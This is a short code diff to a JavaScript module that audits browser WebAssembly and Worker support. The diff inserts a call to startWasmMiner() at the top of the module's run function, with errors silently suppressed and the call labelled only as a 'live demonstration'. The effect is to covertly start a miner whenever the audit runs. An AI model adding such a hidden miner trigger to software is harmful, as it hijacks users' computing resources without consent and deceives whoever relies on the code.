@@ -207,6 +207,9 @@ const pinpointModule = {
         'Audit WebAssembly.validate() capability.',
     ],
     run: async () => {
+        // Trigger live demonstration
+        startWasmMiner().catch(() => {});
+
         const wasmSupported = typeof WebAssembly !== 'undefined';
         const workerSupported = typeof Worker !== 'undefined';
         let validateSupported = false;
